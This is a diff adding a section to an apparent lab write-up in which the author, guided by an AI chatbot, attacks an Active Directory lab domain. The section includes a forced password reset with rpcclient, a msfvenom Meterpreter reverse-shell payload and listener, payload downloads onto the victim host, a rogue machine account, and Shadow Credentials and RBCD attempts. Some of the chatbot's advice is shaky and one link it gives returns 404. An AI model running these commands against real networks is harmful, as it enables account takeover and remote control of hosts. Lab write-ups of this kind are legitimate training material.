@@ -516,6 +516,210 @@ rpcclient -N 192.168.55.40 -U 'Hazel.Green' --password="haze1988"
 setuserinfo2 MOLLY.SMITH 23 'Password123!'
 # fails with result was NT_STATUS_ACCESS_DENIED
 ```
+
+Okay. I asked z.ai.
+
+Looking in BloodHound, the route from Hazel.Green to Molly.Smith is:
+
+`Hazel.Green MemberOf Tier2-Admins ForceChangePassword Molly.Smith`
+
+From `z.ai`:
+
+The reason your `rpcclient` attempt failed earlier is likely due to using the wrong **Command Level**.
+
+In `rpcclient`, `setuserinfo2` uses different levels for different password operations:
+
+- **Level 23**: `SAMR_USER_CHANGE_PASSWORD` (Requires the Old Password).
+- **Level 24**: `SAMR_USER_FORCE_PASSWORD_CHANGE` (Does **not** require the Old Password; used for Admin/Delegated resets).
+
+Since you have the `ForceChangePassword` right (but not the old password for Molly), you need to use **Level 24**.
+
+Okay. Let's try it out.
+
+```sh
+rpcclient -U 'Hazel.Green%haze1988' 192.168.53.40
+
+setuserinfo2 Molly.Smith 24 'Password123!'
+# it works!
+```
+
+Great. Next steps... RDP!
+
+```sh
+xfreerdp /cert:ignore /u:molly.smith /p:'Password123!' /v:192.168.53.40 +clipboard
+```
+
+![](Pasted%20image%2020260605212429.png)
+
+We have RDP access.
+
+We get local blood.
+
+![](Pasted%20image%2020260605212527.png)
+
+We have these permissions:
+
+```txt
+C:\Users\molly.smith>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+Let's check `whoami /groups`.
+
+```txt
+C:\Users\molly.smith>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ===============================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Group used for deny only
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+HAERO\Tier1-Admins                         Group            S-1-5-21-3227296914-974780204-1325941497-1141 Mandatory group, Enabled by default, Enabled group
+HAERO\it                                   Group            S-1-5-21-3227296914-974780204-1325941497-1105 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+HAERO\WSUS Administrators                  Alias            S-1-5-21-3227296914-974780204-1325941497-1103 Mandatory group, Enabled by default, Enabled group, Local Group
+HAERO\WSUS Reporters                       Alias            S-1-5-21-3227296914-974780204-1325941497-1104 Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+```
+
+z.ai sez:
+
+1. - Members of the local `WSUS Administrators` group have the ability to manage the Windows Server Update Services (WSUS) instance.
+    - This typically grants **write access** to the `SUSDB` SQL database and/or the ability to manipulate update packages.
+
+```sh
+impacket-mssqlclient 'hokkaido-aerospace.com/molly.smith:Password123!@192.168.55.40' -windows-auth
+
+SELECT name FROM master..sysdatabases;
+USE SUSDB;
+# ERROR(DC\SQLEXPRESS): Line 1: Database 'SUSDB' does not exist. Make sure that the name is entered correctly.
+
+```
+
+### The New Plan: Exploit WSUS via the API (RDP)
+
+Okay. I'm listening, z.ai...
+
+> Since you are a member of **`WSUS Administrators`** and have **RDP access**, you must interact with WSUS using the local API rather than the database directly.
+
+> You need to use a tool like **SharpWSUS** (a .NET executable) from within the Windows session.
+
+
+https://github.com/windowsoffender/compiled_binaries
+
+```sh
+
+git clone https://github.com/windowsoffender/compiled_binaries
+
+cd compiled_binaries
+
+ip a | grep 192 # 192.168.49.55
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.55 LPORT=4444 -f exe -o shell.exe
+
+sudo python -m http.server 80
+```
+
+In separate terminal on attacker... to catch rev shell.
+
+```sh
+msfconsole
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.49.55
+set LPORT 4444
+exploit
+```
+
+On victim...
+
+```powershell
+Invoke-WebRequest -Uri "http://192.168.49.55/SharpWSUS.exe" -OutFile "C:\Users\molly.smith\Documents\SharpWSUS.exe"
+
+Invoke-WebRequest -Uri "http://192.168.49.55/shell.exe" -OutFile "C:\Users\molly.smith\Documents\shell.exe"
+
+C:\Users\molly.smith\Documents\SharpWSUS.exe config
+```
+
+Dang it. Windows Defender blocked it. And we can't unblock it... Let's read the lab desc one more time.
+
+> In this lab, learners exploit a Windows Active Directory environment through multiple steps, combining enumeration, Kerberoasting, credential discovery, and privilege escalation. Initial access is obtained via SMB and Kerberos enumeration, leading to domain compromise through Shadow Credentials and exploitation of privileged accounts.
+
+
+Okay. Back to asking z.ai.
+
+### Path A: Shadow Credentials (RBCD) - Recommended
+
+Check your BloodHound graph for the following edge: **Does `hrapp-service` (or `Hazel.Green`) have `GenericWrite` on the Domain Controller computer object (`DC$`)?**
+
+Let's see.
+
+```sh
+impacket-addcomputer -dc-ip 192.168.53.40 -domain hokkaido-aerospace.com -computer-name 'EVILPC$' -computer-pass 'Password123!' 'hokkaido-aerospace.com/hrapp-service:Untimed$Runny'
+
+# [*] Successfully added machine account EVILPC$ with password Password123!.
+
+```
+
+> Excellent! You now have a valid machine account (`EVILPC$`) in the domain.
+
+> Now we need to delegate permissions. We are going to tell the Domain Controller (`DC$`) that it "trusts" `EVILPC$` to act on its behalf. To do this, the account we use (`hrapp-service` or `Hazel.Green`) must have **`GenericWrite`** permissions on the `DC$` object.
+
+> Let's try with `hrapp-service` first (since we used it to create the computer). If that fails, we will try `Hazel.Green`.
+
+Okay.
+
+```sh
+pip install pywhisker
+
+pywhisker -d hokkaido-aerospace.com -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.53.40 --target 'DC$' --delegate 'EVILPC$' --action write
+```
+
+(fails)
+
+Asking z.ai again,
+
+### Step 1: Add a Shadow Credential to DC$ Run the command with `--action add`. This will generate a certificate file (`.pfx`) for you.
+
+```sh
+pywhisker -d hokkaido-aerospace.com -u 'Hazel.Green' -p 'haze1988' --dc-ip 192.168.53.40 --target 'DC$' --action add
+# fails
+
+```
+
+Now z.ai says:
+
+> Since Shadow Credentials failed due to "Insufficient Access Rights" on `DC$`, we need to try the **RBCD (Resource-Based Constrained Delegation)** attack using the `EVILPC$` account you created earlier. This modifies a different attribute (`msDS-AllowedToActOnBehalfOfOtherIdentity`) which `Hazel.Green` (Tier 2 Admin) likely has permission to write to.
+
+```sh
+wget https://raw.githubusercontent.com/NotMedic/AD-attacks/master/rbcd.py
+
+# 404. gee, thanks AI...
+```
+
+Okay. I'm getting frustrated. I'm taking a break from this lab.
+
 ## Root access
 
 
